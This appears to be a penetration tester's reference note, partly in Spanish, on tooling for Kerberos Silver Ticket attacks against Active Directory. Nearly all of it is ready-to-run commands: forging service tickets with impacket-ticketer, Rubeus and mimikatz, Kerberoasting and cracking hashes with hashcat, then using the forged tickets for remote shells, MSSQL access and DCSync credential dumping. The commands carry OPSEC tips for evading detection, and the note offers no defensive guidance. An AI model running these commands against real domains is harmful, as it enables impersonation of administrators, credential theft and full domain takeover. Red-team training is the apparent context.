---
aliases:
  - Silver Ticket Tools
  - impacket-ticketer silver
  - Rubeus silver
tags:
  - type/tool
  - technique/persistence
  - technique/kerberos
  - env/windows
  - env/linux
  - asset/active-directory
type: Tool
linked:
  - '[[Silver Ticket]]'
---

# Silver Ticket - Tooling

***

## impacket-ticketer (silver mode)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-ticketer -nthash HASH -domain-sid SID -domain corp.local -spn cifs/host.corp.local administrator` | TGS forjado RC4 | Linux standard. |
| `impacket-ticketer -aesKey AES256 ... -spn cifs/host administrator` | TGS forjado AES256 | OPSEC. |
| `impacket-ticketer ... -user-id 500 -groups 513,512,520,518,519 -spn cifs/host administrator` | TGS con PAC completo | Full PAC. |
| `impacket-ticketer ... -spn ldap/dc.corp.local administrator` | TGS LDAP — DCSync sin DA | Computer DC$ hash. |
| `impacket-ticketer ... -duration 24 -spn cifs/host administrator` | Lifetime 24h | Realista. |
^st-tool-ticketer

```bash
# Full OPSEC silver forge
impacket-ticketer \
  -aesKey AES256_COMPUTER_KEY \
  -domain-sid S-1-5-21-... \
  -domain corp.local \
  -spn cifs/web01.corp.local \
  -user-id 500 \
  -groups 513,512 \
  -duration 24 \
  administrator

export KRB5CCNAME=administrator.ccache
```

___

## impacket-GetUserSPNs

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-GetUserSPNs corp.local/user:'pass'@DC` | Lista SPNs registrados | Discovery. |
| `impacket-GetUserSPNs corp.local/user:'pass'@DC -request` | TGS hashes (Kerberoast) | Crack → silver hash. |
| `impacket-GetUserSPNs corp.local/user:'pass'@DC -request -usersfile targets.txt` | TGS targeted | Selectivo. |
| `impacket-GetUserSPNs -no-preauth user -dc-ip DC -request 'TARGET$'` | TGS sin auth (target con preauth off) | AS-REP roast variant. |
^st-tool-getuserspns

```bash
impacket-GetUserSPNs corp.local/user:'P@ssw0rd'@dc01.corp.local -request -outputfile kerb.txt
hashcat -m 13100 kerb.txt rockyou.txt
```

___

## Rubeus silver

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Rubeus.exe silver /service:cifs/host /rc4:HASH /user:admin /ptt` | TGS RC4 + inject | Standard. |
| `Rubeus.exe silver /service:cifs/host /aes256:KEY /ldap /user:admin /ptt` | TGS AES256 con PAC LDAP | OPSEC. |
| `Rubeus.exe silver /service:host/HOST,rpcss/HOST /rc4:HASH /user:admin /ptt` | Multi-SPN ticket | WMI lateral. |
| `Rubeus.exe silver ... /outfile:silver.kirbi` | Sin inject — guardar | Transfer. |
| `Rubeus.exe silver ... /endin:600 /renewmax:10080` | Lifetime realista | OPSEC lifetime. |
^st-tool-rubeus

```powershell
.\Rubeus.exe silver `
  /service:cifs/web01.corp.local `
  /aes256:AES256KEY `
  /user:administrator /id:500 `
  /domain:corp.local /sid:S-1-5-21-... `
  /ldap /endin:600 /ptt /opsec
```

___

## mimikatz kerberos::golden (silver mode)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `kerberos::golden /user:admin /domain:d /sid:SID /target:host /service:cifs /rc4:HASH /ptt` | TGS RC4 + inject | On-host. |
| `kerberos::golden /user:admin /domain:d /sid:SID /target:host /service:cifs /aes256:KEY /ptt` | TGS AES256 | OPSEC. |
| `kerberos::golden ... /service:cifs /target:host /id:500 /groups:512,513 /ptt` | Con RID + groups | Full PAC. |
| `kerberos::purge` | Limpiar tickets antes de inject | Pre-inject siempre. |
^st-tool-mimi

```
mimikatz # kerberos::purge
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /target:web01.corp.local /service:cifs /rc4:NTHASH /id:500 /ptt
mimikatz # misc::cmd
```

___

## impacket post-silver (uso del ticket)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `export KRB5CCNAME=admin.ccache && impacket-psexec -k -no-pass corp.local/admin@host` | Shell SMB | Post-cifs silver. |
| `impacket-wmiexec -k -no-pass corp.local/admin@host` | Shell WMI | Post-host/rpcss silver. |
| `impacket-mssqlclient -k -no-pass corp.local/admin@host -windows-auth` | MSSQL Kerberos auth | Post-mssqlsvc silver. |
| `impacket-secretsdump -k -no-pass corp.local/admin@dc.corp.local -just-dc` | Full DCSync | Post-ldap/ silver. |
| `impacket-smbclient -k -no-pass corp.local/admin@host` | SMB file access | Post-cifs silver. |
^st-tool-uso

```bash
export KRB5CCNAME=administrator.ccache
klist
impacket-wmiexec -k -no-pass corp.local/administrator@web01.corp.local
```

___

## Recursos

| **Recurso** | **URL** |
|:---:|:---:|
| impacket-ticketer | `https://github.com/fortra/impacket` |
| Rubeus silver | `https://github.com/GhostPack/Rubeus#silver` |
| HackTricks — Silver Ticket | `https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket` |
| ADSecurity — Silver Tickets | `https://adsecurity.org/?p=2011` |
| The Hacker Recipes — Silver | `https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver` |
| MITRE ATT&CK T1558.002 | `https://attack.mitre.org/techniques/T1558/002/` |
^st-tool-resources

***
